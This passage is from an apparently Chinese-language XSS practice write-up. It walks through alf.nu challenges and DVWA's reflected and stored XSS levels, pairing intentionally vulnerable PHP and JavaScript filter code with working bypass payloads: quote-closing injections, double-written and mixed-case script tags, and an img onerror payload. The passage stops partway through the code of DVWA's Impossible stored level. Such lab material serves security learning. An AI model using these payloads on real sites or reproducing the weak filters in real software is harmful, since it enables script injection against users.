<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (s) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeJs</span> (s) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>(s)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个过滤不知道是不是写错了好像没什么用0.0</p>
<p>直接构造闭合</p>
<h5 id="input-code-17">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;);alert(1)//</span><br></pre></td></tr></table></figure>
<h5 id="html-17">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> url = <span class="string">&#x27;javascript:console.log(&quot;\&quot;);alert(1)\/\/&quot;)&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  a.<span class="property">href</span> = url</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">  a.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x12">0X12</h4>
<h5 id="server-code-18">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (s) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处匹配<strong>"</strong>替换成<strong>\"</strong>，因此只要再传入一个<strong>\</strong>把第一个<strong>\</strong>转义掉就行了。</p>
也可以构造**
<script>
<p>**标签来闭合。</p>
<h5 id="input-code-18">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">\&quot;);alert(1);//</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(1);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-18">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\\&quot;</span>);<span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//&quot;);</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(1);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来几题是<a
href="https://github.com/ethicalhack3r/DVWA">DVWA</a>的反射型。</p>
<h4 id="low">Low</h4>
<h5 id="server-code-19">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>); </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>没什么过滤，直接<strong>XSS</strong>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="medium">Medium</h4>
<h5 id="server-code-20">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>); </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
过滤了一次**
<script>
<p>**标签，双写绕过或者大小写绕过。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="high">High</h4>
<h5 id="server-code-21">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>); </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
过滤了**
<script>
<p><strong>标签，且正则中</strong>i<strong>也不区分大小写，那么使用</strong>img<strong>中的</strong>oneerror**属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="impossible">Impossible</h4>
<h5 id="server-code-22">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>使用一个<strong>htmlspecialchars</strong>函数把<strong>&amp;、"、'、&lt;、&gt;</strong>
这几个字符全部转成了<strong>HTML</strong>编码。</p>
<p>然后就变成了<strong>Impossible</strong>。。。</p>
<h3 id="储存型xss例题">储存型XSS例题：</h3>
<h4 id="low-1">Low</h4>
<h5 id="server-code-23">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h5 id="笔记-2">笔记</h5>
<p><strong>trim(string,charlist)</strong>函数【XD又碰到了移除字符串两侧的空白字符或其他预定义字符，预定义字符包括<strong>、0B、以及空格，可选参数</strong>charlist**支持添加额外需要删除的字符。</p>
<p><strong>mysql_real_escape_string(string,connection)</strong>函数会对字符串中的特殊符号<strong>、、、'、"、1a</strong>进行转义。</p>
<p><strong>stripslashes(string)</strong>函数删除字符串中的反斜杠。</p>
<p>因此可以看到，输入并没有做<strong>XSS</strong>方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型<strong>XSS</strong>漏洞。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="medium-1">Medium</h4>
<h5 id="server-code-24">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h5 id="笔记-3">笔记</h5>
<p><strong>strip_tags()</strong>函数剥去字符串中的<strong>HTML、XML</strong>以及<strong>PHP</strong>的标签，但允许使用<strong><b></strong>标签。</p>
<p><strong>addslashes()</strong>函数返回在预定义字符<strong>'、"、、NULL</strong>之前添加反斜杠的字符串。</p>
可以看到，由于对<strong>message</strong>参数使用了<strong>htmlspecialchars</strong>函数进行编码，因此无法再通过<strong>message</strong>参数注入<strong>XSS</strong>代码，但是对于<strong>name</strong>参数，只是简单过滤了一次**
<script>
<p>**标签，双写绕过或者大小写绕过。</p>
过滤了一次**
<script>
<p>**标签，双写绕过或者大小写绕过。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="high-1">High</h4>
<h5 id="server-code-25">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
只过滤了**
<script>
<p><strong>标签，且正则中</strong>i<strong>不区分大小写，那么就使用</strong>img<strong>的</strong>oneerror**属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="impossible-1">Impossible</h4>
<h5 id="server-code-26">Server Code</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = 